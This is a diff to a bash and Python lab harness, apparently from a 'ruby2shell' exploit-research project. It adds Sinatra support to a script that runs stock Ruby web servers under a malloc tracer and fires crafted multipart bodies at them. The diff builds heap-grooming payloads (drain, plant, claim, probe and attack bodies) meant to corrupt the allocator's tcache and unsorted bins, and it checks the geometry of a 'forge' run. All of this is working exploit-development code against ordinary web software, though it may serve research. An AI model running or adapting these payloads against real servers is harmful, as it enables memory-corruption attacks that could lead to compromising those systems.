@@ -21,7 +21,15 @@
 set -u
 cd "$(dirname "$0")/../.." || exit 1
 EV=lab/build/evidence
-APP=lab/build/rails-stock-app
+STACK="${RUBY2SHELL_CLAIM_STACK:-rails}"
+LABEL="stock-$STACK"
+if [ "$STACK" = sinatra ]; then
+  APP=lab/repro/ruby2shell-stock-baseline.ru
+  READY_PATH=/
+else
+  APP=lab/build/rails-stock-app
+  READY_PATH=/up
+fi
 RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
 N="${RUBY2SHELL_CLAIM_N:-588}"
 TAGP="${RUBY2SHELL_CLAIM_TAG:-sc588}"
@@ -36,12 +44,12 @@ COUNT="${RUBY2SHELL_CLAIM_COUNT:-12}"
 GAP="${RUBY2SHELL_CLAIM_GAP:-0}"
 BASE=4810
 export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
-PFX="$EV/stock-rails-$TAGP"
+PFX="$EV/$LABEL-$TAGP"
 if [ "${1:-}" = "--one" ]; then
   i="$2"; PORT=$((BASE + i)); TAG="$TAGP-$i"
-  LOG="$EV/stock-rails-$TAG.server.log"
-  PIDF="$PWD/$EV/stock-rails-$TAG.pid"
-  ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
+  LOG="$EV/$LABEL-$TAG.server.log"
+  PIDF="$PWD/$EV/$LABEL-$TAG.pid"
+  ARM="$PWD/$EV/$LABEL-$TAG.case-arm"
   rm -f "$ARM"
   THREAD_ENV=()
   [ "${RUBY2SHELL_CLAIM_THREADS:-0}" = 1 ] && THREAD_ENV=(RAILS_MAX_THREADS=1)
@@ -51,16 +59,21 @@ if [ "${1:-}" = "--one" ]; then
   GDB_ENV=()
   [ -n "${RUBY2SHELL_CLAIM_GDB:-}" ] && GDB_ENV=(MTRACE_CASE_STOP=1)
   [ -n "${RUBY2SHELL_CLAIM_BINDUMPS:-}" ] && GDB_ENV+=(MTRACE_DUMP_BINS=1)
-  env "${THREAD_ENV[@]}" "${GDB_ENV[@]}" MTRACE_FD=2 MTRACE_FREE_DUMP=1 \
+  SERVER_ENV=("${THREAD_ENV[@]}" "${GDB_ENV[@]}" MTRACE_FD=2 MTRACE_FREE_DUMP=1 \
     MTRACE_CASE_REQUEST=$((N + 44)) \
     MTRACE_CASE_ARM_FILE="$ARM" MTRACE_EMIT_ARM_FILE="$ARM" \
-    LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
-    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDF" \
-    > "$LOG" 2>&1 &
+    LD_PRELOAD="$PWD/lab/preload/mtrace.so")
+  if [ "$STACK" = sinatra ]; then
+    env "${SERVER_ENV[@]}" RUBY2SHELL_STOCK_PORT="$PORT" "$RB" "$APP" \
+      > "$LOG" 2>&1 &
+  else
+    env "${SERVER_ENV[@]}" "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDF" \
+      > "$LOG" 2>&1 &
+  fi
   PID=$!
   READY=NO
   for _ in $(seq 1 300); do
-    curl -s -m 1 "http://127.0.0.1:$PORT/up" >/dev/null 2>&1 && { READY=YES; break; }
+    curl -s -m 1 "http://127.0.0.1:$PORT$READY_PATH" >/dev/null 2>&1 && { READY=YES; break; }
     sleep 0.1
   done
   if [ "$READY" != YES ]; then
@@ -76,7 +89,7 @@ if [ "${1:-}" = "--one" ]; then
   if [ -n "$DRAIN_SPEC" ] && [ -f "$PFX.drain.body" ]; then
     P0=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$DRAIN_ROUTE" \
       -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
-      --data-binary "@$PFX.drain.body" -o "$EV/stock-rails-$TAG.drain.html" \
+      --data-binary "@$PFX.drain.body" -o "$EV/$LABEL-$TAG.drain.html" \
       -w '%{http_code}' 2>>"$LOG")
   fi
   if [ "${RUBY2SHELL_CLAIM_NO_PLANT:-0}" = 1 ]; then
@@ -84,7 +97,7 @@ if [ "${1:-}" = "--one" ]; then
   else
     P1=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$PLANT_ROUTE" \
       -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
-      --data-binary "@$PFX.plant.body" -o "$EV/stock-rails-$TAG.plant.html" \
+      --data-binary "@$PFX.plant.body" -o "$EV/$LABEL-$TAG.plant.html" \
       -w '%{http_code}' 2>>"$LOG")
     [ "$GAP" != 0 ] && sleep "$GAP"
   fi
@@ -103,25 +116,25 @@ if [ "${1:-}" = "--one" ]; then
   fi
   P2=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
     -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
-    --data-binary "@$PFX.attack.body" -o "$EV/stock-rails-$TAG.attack.html" \
+    --data-binary "@$PFX.attack.body" -o "$EV/$LABEL-$TAG.attack.html" \
     -w '%{http_code}' 2>>"$LOG")
   P3=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
     -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
-    --data-binary "@$PFX.claim.body" -o "$EV/stock-rails-$TAG.claim.html" \
+    --data-binary "@$PFX.claim.body" -o "$EV/$LABEL-$TAG.claim.html" \
     -w '%{http_code}' 2>>"$LOG")
   P4=NA
   if [ "${RUBY2SHELL_CLAIM_MODE:-strip}" = poison ]; then
     P4=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
       -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
-      --data-binary "@$PFX.probe.body" -o "$EV/stock-rails-$TAG.probe.html" \
+      --data-binary "@$PFX.probe.body" -o "$EV/$LABEL-$TAG.probe.html" \
       -w '%{http_code}' 2>>"$LOG")
   fi
   rm -f "$ARM"
-  A1=$(curl -s -m 5 "http://127.0.0.1:$PORT/up" -o /dev/null -w '%{http_code}' 2>>"$LOG")
+  A1=$(curl -s -m 5 "http://127.0.0.1:$PORT$READY_PATH" -o /dev/null -w '%{http_code}' 2>>"$LOG")
   ALIVE=NO
   if kill -0 "$PID" 2>/dev/null; then
     ALIVE=YES
-    cat "/proc/$PID/maps" > "$EV/stock-rails-$TAG.maps" 2>/dev/null
+    cat "/proc/$PID/maps" > "$EV/$LABEL-$TAG.maps" 2>/dev/null
     kill "$PID" 2>/dev/null
   fi
   wait "$PID" 2>/dev/null
@@ -129,26 +142,30 @@ if [ "${1:-}" = "--one" ]; then
   exit 0
 fi
 
-if [ ! -f "$APP/config/environment.rb" ]; then
-  echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
-  exit 2
+if [ "$STACK" = sinatra ]; then
+  [ -f "$APP" ] || { echo "missing stock Sinatra app $APP" >&2; exit 2; }
+else
+  [ -f "$APP/config/environment.rb" ] || {
+    echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
+    exit 2
+  }
 fi
 if [ ! -x "$RB" ]; then
   echo "missing plain ruby build $RB" >&2
   exit 2
 fi
 
-rm -f "$PFX".*.body "$EV"/stock-rails-"$TAGP"-*.{server.log,html,maps,pid} \
-      "$PFX.summary" "$EV"/stock-rails-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null
+rm -f "$PFX".*.body "$EV"/"$LABEL"-"$TAGP"-*.{server.log,html,maps,pid} \
+      "$PFX.summary" "$EV"/"$LABEL"-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null
 
-EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" DRAIN_SPEC="$DRAIN_SPEC" \
+EV_DIR="$EV" LABEL="$LABEL" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" DRAIN_SPEC="$DRAIN_SPEC" \
 PLANT_METHOD="$PLANT_METHOD" DRAIN_METHOD="$DRAIN_METHOD" \
 CLAIM_LIST="$CLAIM_LIST" \
 CLAIM_MODE="${RUBY2SHELL_CLAIM_MODE:-strip}" \
 python3 - "$N" <<'PY'
 import sys, os
 n = int(sys.argv[1])
-ev, tag = os.environ['EV_DIR'], os.environ['TAG']
+ev, tag, label = os.environ['EV_DIR'], os.environ['TAG'], os.environ['LABEL']
 mode = os.environ['CLAIM_MODE']
 def part(name, content, ctype):
     return (b'--XB\r\nContent-Disposition: form-data; name="' + name +
@@ -164,6 +181,17 @@ if mode == 'poison':
     # mid-parse, freeing the planted chunks into tcache/unsorted before
     # the upcase
     attack_parts = []
+    method_part = part(b'_method', method, b'text/plain; charset=ISO-8859-1')
+    method_first = os.environ.get('METHOD_FIRST', '0') == '1'
+    if method_first:
+        attack_parts.append(method_part)
+    for grp in os.environ.get('CONSUMER_SPEC', '').split(','):
+        if not grp:
+            continue
+        size, count = (int(v, 0) for v in grp.split('x'))
+        for _ in range(count):
+            attack_parts.append(
+                part(f'k{len(attack_parts)}'.encode(), b'k' * size, AB))
     for grp in os.environ.get('FILLER_SPEC', '').split(','):
         if not grp:
             continue
@@ -178,8 +206,8 @@ if mode == 'poison':
         for _ in range(count):
             attack_parts.append(
                 part(f'y{len(attack_parts)}'.encode(), b'y' * size, AB))
-    attack_parts.append(
-        part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
+    if not method_first:
+        attack_parts.append(method_part)
 else:
     drain = (pattern * ((1024 + 15) // 16))[:1024]
     attack_parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
@@ -244,7 +272,7 @@ for grp in os.environ['PLANT_SPEC'].split(','):
         pp.append(part(f'p{len(pp)}'.encode(), plant_content(size), AB))
 if os.environ.get('PLANT_METHOD'):
     pp.append(part(b'_method', os.environ['PLANT_METHOD'].encode(), ISO))
-open(f'{ev}/stock-rails-{tag}.plant.body', 'wb').write(
+open(f'{ev}/{label}-{tag}.plant.body', 'wb').write(
     b'\r\n'.join(pp) + b'\r\n--XB--\r\n')
 dp = []
 for grp in os.environ.get('DRAIN_SPEC', '').split(','):
@@ -257,7 +285,7 @@ for grp in os.environ.get('DRAIN_SPEC', '').split(','):
 if dp:
     if os.environ.get('DRAIN_METHOD'):
         dp.append(part(b'_method', os.environ['DRAIN_METHOD'].encode(), ISO))
-    open(f'{ev}/stock-rails-{tag}.drain.body', 'wb').write(
+    open(f'{ev}/{label}-{tag}.drain.body', 'wb').write(
         b'\r\n'.join(dp) + b'\r\n--XB--\r\n')
 cp = []
 for v in os.environ['CLAIM_LIST'].split(','):
@@ -272,7 +300,7 @@ for v in os.environ['CLAIM_LIST'].split(','):
         hdr, nsize = int(h, 0), int(s, 0)
     cp.append(part(f'c{len(cp)}'.encode(),
                    claim_content(size, hdr, nsize), AB))
-open(f'{ev}/stock-rails-{tag}.claim.body', 'wb').write(
+open(f'{ev}/{label}-{tag}.claim.body', 'wb').write(
     b'\r\n'.join(cp) + b'\r\n--XB--\r\n')
 if mode == 'poison':
     qp = []
@@ -282,7 +310,7 @@ if mode == 'poison':
         size, count = (int(v, 0) for v in grp.split('x'))
         for _ in range(count):
             qp.append(part(f'q{len(qp)}'.encode(), b'Q' * size, AB))
-    open(f'{ev}/stock-rails-{tag}.probe.body', 'wb').write(
+    open(f'{ev}/{label}-{tag}.probe.body', 'wb').write(
         b'\r\n'.join(qp) + b'\r\n--XB--\r\n')
     hp = []
     for grp in os.environ.get('CHURN_SPEC', '400x20').split(','):
@@ -291,7 +319,7 @@ if mode == 'poison':
         size, count = (int(v, 0) for v in grp.split('x'))
         for _ in range(count):
             hp.append(part(f'h{len(hp)}'.encode(), b'h' * size, AB))
-    open(f'{ev}/stock-rails-{tag}.churn.body', 'wb').write(
+    open(f'{ev}/{label}-{tag}.churn.body', 'wb').write(
         b'\r\n'.join(hp) + b'\r\n--XB--\r\n')
     # ATTACK_CHAIN: ride the claim and probe parts inside the attack
     # body, after _method — the unsorted re-bin, the exact-fit claim pop
@@ -301,11 +329,11 @@ if mode == 'poison':
         attack_parts.extend(cp)
         attack_parts.extend(qp)
     attack_parts.append(part(b'f', (pattern * 16)[:256], AB))
-    open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
+    open(f'{ev}/{label}-{tag}.attack.body', 'wb').write(
         b'\r\n'.join(attack_parts) + b'\r\n--XB--\r\n')
 else:
     attack_parts.append(part(b'f', (pattern * 16)[:256], AB))
-    open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
+    open(f'{ev}/{label}-{tag}.attack.body', 'wb').write(
         b'\r\n'.join(attack_parts) + b'\r\n--XB--\r\n')
 PY
 
@@ -318,7 +346,7 @@ fi
 
 # geometry check: at N=588 the attack body must be byte-identical to the
 # surviving chosen-header forge run's wire input (cov-n588 family)
-if [ "$N" = 588 ] && [ -f "$EV/stock-rails-cov-n588-18.body" ]; then
+if [ "$STACK" = rails ] && [ "$N" = 588 ] && [ -f "$EV/stock-rails-cov-n588-18.body" ]; then
   if ! cmp -s "$PFX.attack.body" "$EV/stock-rails-cov-n588-18.body"; then
     echo "attack body at N=588 does not match the cov-n588 geometry; aborting" >&2
     exit 2
@@ -327,14 +355,14 @@ fi
 
 seq 1 "$COUNT" | xargs -P6 -I{} "$0" --one {}
 
-TAG="$TAGP" N="$N" CLAIM_LIST="$CLAIM_LIST" \
+LABEL="$LABEL" TAG="$TAGP" N="$N" CLAIM_LIST="$CLAIM_LIST" \
 python3 - <<'PY'
 import glob, os, re, sys
 tag = os.environ['TAG']
 n = int(os.environ['N'])
 claim_reqs = {int(v.split('@', 1)[0], 0) + 9 for v in os.environ['CLAIM_LIST'].split(',') if v}
 rows = []
-for logf in sorted(glob.glob(f'lab/build/evidence/stock-rails-{tag}-*.server.log'),
+for logf in sorted(glob.glob(f'lab/build/evidence/{os.environ["LABEL"]}-{tag}-*.server.log'),
                     key=lambda p: int(re.search(r'-(\d+)\.server\.log$', p).group(1))):
     run = re.search(r'-(\d+)\.server\.log$', logf).group(1)
     text = open(logf, errors='replace').read()
@@ -412,7 +440,7 @@ for r in rows:
     if r[5]:
         print(f"    other-reqs:   {sorted(set(r[5]))[:8]}")
 print("-- per-run result lines:")
-summ = f'lab/build/evidence/stock-rails-{tag}.summary'
+summ = f'lab/build/evidence/{os.environ["LABEL"]}-{tag}.summary'
 if os.path.exists(summ):
     print(open(summ).read().rstrip())
 PY
